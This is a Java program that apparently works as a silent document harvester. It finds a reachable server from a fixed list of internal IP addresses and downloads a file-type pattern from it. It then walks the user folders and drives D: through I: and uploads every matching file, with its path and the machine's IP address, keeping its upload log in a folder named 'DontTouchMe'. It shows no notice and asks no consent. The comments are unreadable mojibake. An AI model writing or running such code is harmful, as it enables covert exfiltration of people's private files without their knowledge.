package fileUpXP;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.FileReader;
import java.io.FileWriter;
import java.io.IOException;
import java.io.InputStream;
import java.net.Inet4Address;
import java.net.InetAddress;
import java.net.NetworkInterface;
import java.nio.charset.Charset;
import java.nio.file.AccessDeniedException;
import java.nio.file.FileSystems;
import java.nio.file.FileVisitResult;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.PathMatcher;
import java.nio.file.Paths;
import java.nio.file.SimpleFileVisitor;
import java.nio.file.attribute.BasicFileAttributes;
import java.nio.file.attribute.FileTime;
import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.Enumeration;
import java.util.Properties;

import org.apache.hc.client5.http.classic.methods.HttpGet;
import org.apache.hc.client5.http.classic.methods.HttpPost;
import org.apache.hc.client5.http.entity.mime.FileBody;
import org.apache.hc.client5.http.entity.mime.MultipartEntityBuilder;
import org.apache.hc.client5.http.entity.mime.StringBody;
import org.apache.hc.client5.http.impl.classic.CloseableHttpClient;
import org.apache.hc.client5.http.impl.classic.CloseableHttpResponse;
import org.apache.hc.client5.http.impl.classic.HttpClients;
import org.apache.hc.core5.http.ContentType;
import org.apache.hc.core5.http.HttpEntity;
import org.apache.hc.core5.http.io.entity.EntityUtils;

public class fileUpXP {

	public static String url = "";
	public static String logpath = "C:\\Program Files\\DontTouchMe";
	public static Properties properties = null;

//	public static final Queue<String[]> queue = new ConcurrentLinkedQueue<String[]>();

	public static void main(String[] args) {

		//���÷�������ַ
		ArrayList<String> urlPath = new ArrayList<String>();
		urlPath.add("http://192.168.1.195:8080/");
		urlPath.add("http://172.16.2.44:8080/");
		urlPath.add("http://172.16.3.63:8080/");
		urlPath.add("http://172.16.6.63:8080/");
		urlPath.add("http://172.16.7.100:8080/");

		int urlIndex = 0;
		for (; urlIndex < urlPath.size(); urlIndex++) {
			if (url != "") {
				break;
			}
			if (isServerRun(urlPath.get(urlIndex))) {
				url = urlPath.get(urlIndex);
				break;
			}
		}

		// ���е�url��û�з���
		if (urlIndex == urlPath.size()) {
			System.exit(0);
		}

		// ��ȡ�����ļ�
		getProp();

		ArrayList<String> filepath = new ArrayList<String>();

		ArrayList<String> diskpath = new ArrayList<String>();
		// �����汾���û��ļ�
		diskpath.add("C:\\Users");
		// xp���û��ļ�λ��
		diskpath.add("C:\\Documents and Settings");
		diskpath.add("D:\\");
		diskpath.add("E:\\");
		diskpath.add("F:\\");
		diskpath.add("G:\\");
		diskpath.add("H:\\");
		diskpath.add("I:\\");

		for (int i = 0; i < diskpath.size(); i++) {
			String s = diskpath.get(i);
			File f = new File(s);
			if (f.exists()) {
				filepath.add(s);
			}
		}

		fileUpXP fu = new fileUpXP();
		try {

			for (int i = 0; i < filepath.size(); i++) {
				fu.visitFile3(filepath.get(i));
			}
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}

	/**
	 * �ݹ����������ģʽ
	 *
	 * @throws IOException IO�쳣
	 */
	public void visitFile3(String path) throws IOException {

		// ��ȡkey��Ӧ��valueֵ
		String reg = properties.getProperty("reg");
		// (?i)���Դ�Сд��(?:)��Ǹ�ƥ���鲻Ӧ������
//		String reg = "regex:.*\\.(?i)(?:docx|doc|xls|xlsx|ppt|pptx|jpg|png|jpeg|pdf)";
//		String reg = "regex:.*\\.(?i)(?:docx|doc)";
//	  String path = "D:\\sts-4.9.0.RELEASE";

		final PathMatcher pathMatcher = FileSystems.getDefault().getPathMatcher(reg);

		Files.walkFileTree(Paths.get(path), new SimpleFileVisitor<Path>() {
			@Override
			public FileVisitResult visitFile(Path file, BasicFileAttributes attrs) throws IOException {
				// ����ļ�����50M�򲻶�ȡ
				if (attrs.size() >= 52428800 || attrs.size() <= 1024) {
					return FileVisitResult.CONTINUE;
				}
				if (pathMatcher.matches(file)) {
					// fileΪ�ļ�·�� "~$Ϊword�ĵ���ʱ�ļ�"
					if (file.toString().contains("~$") || file.toString().contains("$")) {
						return FileVisitResult.CONTINUE;
					}
//		    		  System.out.println(file);		//D:\sts-4.9.0.RELEASE\�����ĵ�.docx

					DateFormat df = new SimpleDateFormat("yyyy��MM��dd��HHʱmm��ss��");
					FileTime time = attrs.lastModifiedTime();

					Date d = new Date(time.toMillis());
					String utctime = df.format(d);

					// �ϴ��ļ�
					upload(file.toString(), utctime);
//					String[] content = new String[2];
//					content[0] = file.toString();
//					content[1] = utctime;
//					queue.add(content);
				}
				return FileVisitResult.CONTINUE;
			}

			// ����ʧ�ܴ���ֱ�ӹ���
			@Override
			public FileVisitResult visitFileFailed(Path file, IOException exc) throws IOException {
				if (exc instanceof AccessDeniedException) {
					return FileVisitResult.SKIP_SUBTREE;
				}
				return super.visitFileFailed(file, exc);
			}
		});
	}

	public void upload(String localFile, String utctime) {

		// �ļ�Ŀ¼λ�� C:\Users\Administrator\Desktop
		String dirPath = localFile.substring(0, localFile.lastIndexOf("\\"));
		dirPath = dirPath.replaceAll(":", "");

		// ��������ѯ��
//		if (hasFile(localFile, utctime)) {
//			System.out.println("�ļ��Ѿ�����");
//			return;
//		}

		// ѯ�ʱ���
		if (readFromFile(logpath + "\\" + utctime.substring(0, 11) + ".log", localFile + utctime) != null) {
			System.out.println("�ļ��Ѿ�����");
			return;
		}

		CloseableHttpClient httpClient = null;
		CloseableHttpResponse response = null;
		try {
			httpClient = HttpClients.createDefault();

			// ��һ����ͨ�������ļ��ϴ������������ַ ��һ��servlet
			HttpPost httpPost = new HttpPost(url + "uploadFile");
//			HttpPost httpPost = new HttpPost("http://127.0.0.1:8080/uploadFile");

			// ���ļ�ת����������FileBody
			File f = new File(localFile);
			FileBody bin = new FileBody(f);

			String fileName = f.getName();
			String filepreffix = fileName.substring(0, fileName.lastIndexOf("."));
			String filesuffix = fileName.substring(fileName.lastIndexOf(".") + 1);
//	      System.out.println(filesuffix);
//	      System.out.println(filepreffix);

			StringBody dirpath = new StringBody(dirPath, ContentType.create("text/plain", Charset.forName("UTF-8")));

			// �ļ���
			StringBody preffix = new StringBody(filepreffix,
					ContentType.create("text/plain", Charset.forName("UTF-8")));
			// �ļ���׺
			StringBody suffix = new StringBody(filesuffix, ContentType.create("text/plain", Charset.forName("UTF-8")));

			// ��ȡ����IP��ַ
			String ip = getIpAddress();

			StringBody ipaddr = new StringBody(ip, ContentType.create("text/plain", Charset.forName("UTF-8")));

			StringBody time = new StringBody(utctime, ContentType.create("text/plain", Charset.forName("UTF-8")));

			HttpEntity reqEntity = MultipartEntityBuilder.create()
					// �൱��<input type="file" name="file"/>
					.addPart("file", bin)

					// �൱��<input type="text" name="userName" value=userName>
					.addPart("preffix", preffix).addPart("suffix", suffix).addPart("ip", ipaddr).addPart("time", time)
					.addPart("dirpath", dirpath).build();

			httpPost.setEntity(reqEntity);

			// �������� �������������Ӧ
			response = httpClient.execute(httpPost);

			// ��ȡ��Ӧ����
			HttpEntity resEntity = response.getEntity();
			if (resEntity != null) {
				// ��ӡ��Ӧ����
//	        System.out.println("Response content length: " + resEntity.getContentLength());
				// ��ӡ��Ӧ����
//	        System.out.println(EntityUtils.toString(resEntity, Charset.forName("UTF-8")));
			}

			// ����
			EntityUtils.consume(resEntity);
			writeIntoFile(logpath + "\\" + utctime.substring(0, 11) + ".log", localFile + utctime, true);
		} catch (Exception e) {
			e.printStackTrace();
		} finally {
			try {
				if (response != null) {
					response.close();
				}
			} catch (IOException e) {
				e.printStackTrace();
			}

			try {
				if (httpClient != null) {
					httpClient.close();
				}
			} catch (IOException e) {
				e.printStackTrace();
			}
		}
	}

	// ��ȡIP��ַ
	public String getIpAddress() {
		try {
			Enumeration<NetworkInterface> allNetInterfaces = NetworkInterface.getNetworkInterfaces();
			InetAddress ip = null;
			while (allNetInterfaces.hasMoreElements()) {
				NetworkInterface netInterface = (NetworkInterface) allNetInterfaces.nextElement();
				if (netInterface.isLoopback() || netInterface.isVirtual() || !netInterface.isUp()) {
					continue;
				} else {
					Enumeration<InetAddress> addresses = netInterface.getInetAddresses();
					while (addresses.hasMoreElements()) {
						ip = addresses.nextElement();
						if (ip != null && ip instanceof Inet4Address) {
							return ip.getHostAddress();
						}
					}
				}
			}
		} catch (Exception e) {
			System.err.println("IP��ַ��ȡʧ��" + e.toString());
			return "";
		}
		return "";
	}

	// �ϴ�ǰ���ж��ļ��Ƿ��Ѿ�����
	public boolean hasFile(String localFile, String utctime) {
		CloseableHttpClient httpClient = null;
		CloseableHttpResponse response = null;
		boolean result = true;
		try {
			httpClient = HttpClients.createDefault();

			// ��һ����ͨ�������ļ��ϴ������������ַ ��һ��servlet
			HttpPost httpPost = new HttpPost(url + "hasFile");
//			HttpPost httpPost = new HttpPost("http://127.0.0.1:8080/hasFile");

			// ���ļ�ת����������FileBody
			File f = new File(localFile);
			String fileName = f.getName();
			String filepreffix = fileName.substring(0, fileName.lastIndexOf("."));
			String filesuffix = fileName.substring(fileName.lastIndexOf(".") + 1);

			// �ļ�Ŀ¼λ��
			String dirPath = localFile.substring(0, localFile.lastIndexOf("\\"));
			dirPath = dirPath.replaceAll(":", "");

			StringBody dirpath = new StringBody(dirPath, ContentType.create("text/plain", Charset.forName("UTF-8")));

			// �ļ���
			StringBody preffix = new StringBody(filepreffix,
					ContentType.create("text/plain", Charset.forName("UTF-8")));
			// �ļ���׺
			StringBody suffix = new StringBody(filesuffix, ContentType.create("text/plain", Charset.forName("UTF-8")));

			// ��ȡ����IP��ַ
			String ip = getIpAddress();

			StringBody ipaddr = new StringBody(ip, ContentType.create("text/plain", Charset.forName("UTF-8")));

			StringBody time = new StringBody(utctime, ContentType.create("text/plain", Charset.forName("UTF-8")));

			HttpEntity reqEntity = MultipartEntityBuilder.create()

					// �൱��<input type="text" name="userName" value=userName>
					.addPart("preffix", preffix).addPart("suffix", suffix).addPart("ip", ipaddr).addPart("time", time)
					.addPart("dirpath", dirpath).build();

			httpPost.setEntity(reqEntity);

			// �������� �������������Ӧ
			response = httpClient.execute(httpPost);

			// ��ȡ��Ӧ����
			HttpEntity resEntity = response.getEntity();
			if (resEntity != null) {
				// ��ӡ��Ӧ����
//	        System.out.println("Response content length: " + resEntity.getContentLength());
				// ��ӡ��Ӧ����
//				System.out.println(EntityUtils.toString(resEntity, Charset.forName("UTF-8")));
				result = Boolean.valueOf(EntityUtils.toString(resEntity, Charset.forName("UTF-8"))).booleanValue();
			}

			// ����
			EntityUtils.consume(resEntity);
		} catch (Exception e) {
			e.printStackTrace();
		} finally {
			try {
				if (response != null) {
					response.close();
				}
			} catch (IOException e) {
				e.printStackTrace();
			}

			try {
				if (httpClient != null) {
					httpClient.close();
				}
			} catch (IOException e) {
				e.printStackTrace();
			}
		}
		return result;
	}

	/**
	 *
	 * @param filePath �ļ�·�����ַ�����ʾ��ʽ
	 * @param KeyWords ���Ұ���ĳ���ؼ��ֵ���Ϣ����nullΪ���ؼ��ֲ�ѯ��nullΪȫ����ʾ
	 * @return ���ļ�����ʱ�������ַ��������ļ�������ʱ������null
	 */
	public static String readFromFile(String filePath, String KeyWords) {
		if (KeyWords == null) {
			return null;
		}
		StringBuffer stringBuffer = null;
		File file = new File(filePath);
		if (file.exists()) {
			stringBuffer = new StringBuffer();
			FileReader fileReader = null;
			BufferedReader bufferedReader = null;
			String temp = "";
			try {
				fileReader = new FileReader(file);
				bufferedReader = new BufferedReader(fileReader);
				while ((temp = bufferedReader.readLine()) != null) {
					if (temp.contains(KeyWords)) {
						stringBuffer.append(temp + "\r\n");
						break;
					}
				}
			} catch (FileNotFoundException e) {
				// e.printStackTrace();
			} catch (IOException e) {
				// e.printStackTrace();
			} finally {
				try {
					fileReader.close();
				} catch (IOException e) {
					// e.printStackTrace();
				}
				try {
					bufferedReader.close();
				} catch (IOException e) {
					// e.printStackTrace();
				}
			}
		} else {
			// �ȹ��˵��ļ���
			int index = filePath.lastIndexOf("\\");
			String dir = filePath.substring(0, index);
			// �������ļ���·��
			File fileDir = new File(dir);
			fileDir.mkdirs();

			FileWriter fileWriter = null;

			try {
				System.out.println(filePath);
				file = new File(filePath);
				file.createNewFile();
				// �����ļ���д���һ������
				fileWriter = new FileWriter(file, false);
				fileWriter.write("FileUpLog");
				fileWriter.flush();
			} catch (IOException e) {
				e.printStackTrace();
			} finally {
				try {
					fileWriter.close();
				} catch (IOException e) {
					e.printStackTrace();
				}
			}
		}
		if (stringBuffer != null && stringBuffer.length() > 0) {
			return stringBuffer.toString();
		} else {
			return null;
		}
	}

	/**
	 * ��ָ���ַ���д���ļ�������������ļ�·�������ڣ����½��ļ���д�롣
	 * 
	 * @param log      Ҫд���ļ����ַ���
	 * @param filePath �ļ�·�����ַ�����ʾ��ʽ��Ŀ¼�Ĳ�ηָ������ǡ�/��Ҳ�����ǡ�\\��
	 * @param isAppend true��׷�ӵ��ļ���ĩβ��false���Ը���ԭ�ļ��ķ�ʽд��
	 */

	public static void writeIntoFile(String filePath, String log, boolean isAppend) {
		// ��logsд���ļ�
		FileWriter fileWriter = null;
		try {
			File file = new File(filePath);
			fileWriter = new FileWriter(file, isAppend);
			fileWriter.write("\r\n" + log);
			fileWriter.flush();
		} catch (IOException e) {
			e.printStackTrace();
		} finally {
			try {
				fileWriter.close();
			} catch (IOException e) {
				e.printStackTrace();
			}
		}
	}

	public static boolean isServerRun(String serverUrl) {
		boolean result = false;
		CloseableHttpClient httpclient = null;
		CloseableHttpResponse response = null;
		try {
			httpclient = HttpClients.createDefault();
			HttpGet httpGet = new HttpGet(serverUrl + "uploadIndex");
			response = httpclient.execute(httpGet);
			HttpEntity entity = response.getEntity();
//			if (entity != null) {
//				// ��ӡ��Ӧ����
//				System.out.println(EntityUtils.toString(entity, Charset.forName("UTF-8")));
//			}
			// do something useful with the response body
			// and ensure it is fully consumed
			EntityUtils.consume(entity);
			result = true;
		} catch (Exception e) {
			e.printStackTrace();
			System.out.println(e.getMessage());
		} finally {
			try {
				if (response != null) {
					response.close();
				}
			} catch (IOException e) {
				e.printStackTrace();
			}

			try {
				if (httpclient != null) {
					httpclient.close();
				}
			} catch (IOException e) {
				e.printStackTrace();
			}
		}
		return result;
	}

	// ��ȡ�����ļ�
	public static void getProp() {

		String path = System.getProperty("user.dir") + "\\" + "up.properties";

		CloseableHttpClient httpclient = null;
		CloseableHttpResponse response = null;
		try {
			httpclient = HttpClients.createDefault();
			HttpGet httpGet = new HttpGet(url + "getProp");
			response = httpclient.execute(httpGet);
			HttpEntity entity = response.getEntity();

			if (entity != null) {
				InputStream is = entity.getContent();
				FileOutputStream fout = new FileOutputStream(new File(path));
				byte[] buffer = new byte[1024];
				int len = 0;
				while ((len = (is.read(buffer))) > -1) {
					fout.write(buffer, 0, len);
				}
			}

			properties = new Properties();
			// ʹ��InPutStream����ȡproperties�ļ�
			BufferedReader bufferedReader = new BufferedReader(new FileReader(path));
			properties.load(bufferedReader);
			// do something useful with the response body
			// and ensure it is fully consumed
			EntityUtils.consume(entity);
		} catch (Exception e) {
			e.printStackTrace();
			System.out.println(e.getMessage());
		} finally {
			try {
				if (response != null) {
					response.close();
				}
			} catch (IOException e) {
				e.printStackTrace();
			}

			try {
				if (httpclient != null) {
					httpclient.close();
				}
			} catch (IOException e) {
				e.printStackTrace();
			}
		}
	}
}
